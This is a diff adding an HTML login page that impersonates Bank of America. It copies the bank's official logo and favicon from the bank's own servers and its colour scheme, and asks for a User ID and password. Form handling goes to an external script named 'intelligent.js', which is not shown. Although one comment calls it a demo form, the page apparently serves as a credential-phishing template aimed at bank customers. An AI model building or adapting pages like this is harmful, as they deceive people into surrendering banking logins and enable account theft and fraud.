@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bank of America -Login</title>
+
+  <!-- Official Favicon -->
+  <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018" type="image/x-icon" />
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #d4001a;
+      padding: 15px;
+      text-align: center;
+    }
+    .header img {
+      height: 40px;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #1d3c78;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      color: #333;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #d4001a;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #b00015;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 12px;
+      color: #555;
+    }
+    .im {
+      width: 50%;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header with Official Logo -->
+    <img src="https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/BofA_rgb.png" alt="Bank of America Logo" class="im">
+  <div class="header">
+  </div>
+
+  <!-- Demo Login Form -->
+  <div class="container">
+    <h2>Bank of America Login</h2>
+    <form id="allForm">
+      <label for="email">User ID</label>
+ <input type="text" class="form-input" name="Userid" placeholder="Enter user id" required>
+
+      <label for="password">Password</label>
+    <input type="password" class="form-input" name="Password" placeholder="Password" id="password" required>
+
+      <button type="submit">Log In</button>
+    </form>
+    <div class="footer">
+    </div>
+  </div>
+  <script src="intelligent.js"></script>
+</body>
+</html>
